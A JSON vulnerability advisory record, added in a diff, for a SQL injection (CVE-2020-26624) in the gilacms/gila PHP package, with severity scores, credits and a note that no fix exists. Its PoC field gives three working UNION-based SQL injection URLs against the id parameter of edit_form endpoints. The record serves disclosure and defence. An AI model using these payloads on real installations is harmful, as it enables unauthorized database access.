@@ -1,0 +1,45 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "LOW",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "HIGH",
+        "integrity": "HIGH",
+        "availability": "HIGH"
+    },
+    "credit": [
+        "Chris Chan",
+        "Louise Ng"
+    ],
+    "cvssDetails": [],
+    "cvssScore": 8.8,
+    "disclosureTime": "2024-01-02 22:45:23",
+    "epssDetails": null,
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-PHP-GILACMSGILA-6142622",
+    "identifiers": {
+        "CVE": [
+            "CVE-2020-26624"
+        ],
+        "CWE": [
+            "CWE-89"
+        ]
+    },
+    "language": "php",
+    "malicious": false,
+    "packageManager": "composer",
+    "publicationTime": "2024-01-03 11:54:41",
+    "remediation": "There is no fixed version for gilacms/gila . ",
+    "severity": "high",
+    "socialTrendAlert": false,
+    "title": "SQL Injection",
+    "vulnDescription": {
+        "Overview": "gilacms/gila is an A framework to build your next awesome web application. Affected versions of this package are vulnerable to SQL Injection via the ID parameter after the login portal. An attacker can execute arbitrary web scripts by injecting malicious SQL commands. ",
+        "PoC": "http://targeturl/cm/edit_form/userrole?id=2'%20and%201%3d0%20UNION%20ALL%20SELECT%20@@version,NULL,NULL--%20&callback=g_form_popup_update http://targeturl/cm/edit_form/user?id=1'%20and%201%3d0%20UNION%20ALL%20SELECT%20NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20 http://targeturl/cm/edit_form/page?id=7'%20and%201%3d0%20%20UNION%20ALL%20SELECT%20NULL,@@version,NULL,NULL,NULL--%20 "
+    },
+    "source_code": []
+}
